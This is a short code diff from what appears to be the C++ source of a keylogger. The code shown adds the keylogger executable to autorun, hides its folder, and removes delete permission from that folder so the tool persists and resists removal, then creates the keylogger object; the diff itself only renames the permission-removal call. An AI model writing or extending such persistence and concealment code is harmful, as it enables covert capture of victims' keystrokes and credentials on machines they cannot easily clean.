@@ -57,7 +57,8 @@ int wmain(int argc, wchar_t* argv[]) {
 		std::vector<std::wstring> args = { argv[1],argv[2],argv[3] };
 		Resilience::AddToAutorun(L"C:\\Keylogger\\keylogger.exe", L"keylogger.exe", args);
 		Resilience::HideFolder(L"C:\\Keylogger");
-		Resilience::RemoveDeletePermission(L"C:\\Keylogger");
+		Resilience::RemoveDeletePermissionFromFolder(L"C:\\Keylogger");
+		
 	}
 
 	keylogger = new Keylogger(client, new Filter(filters));
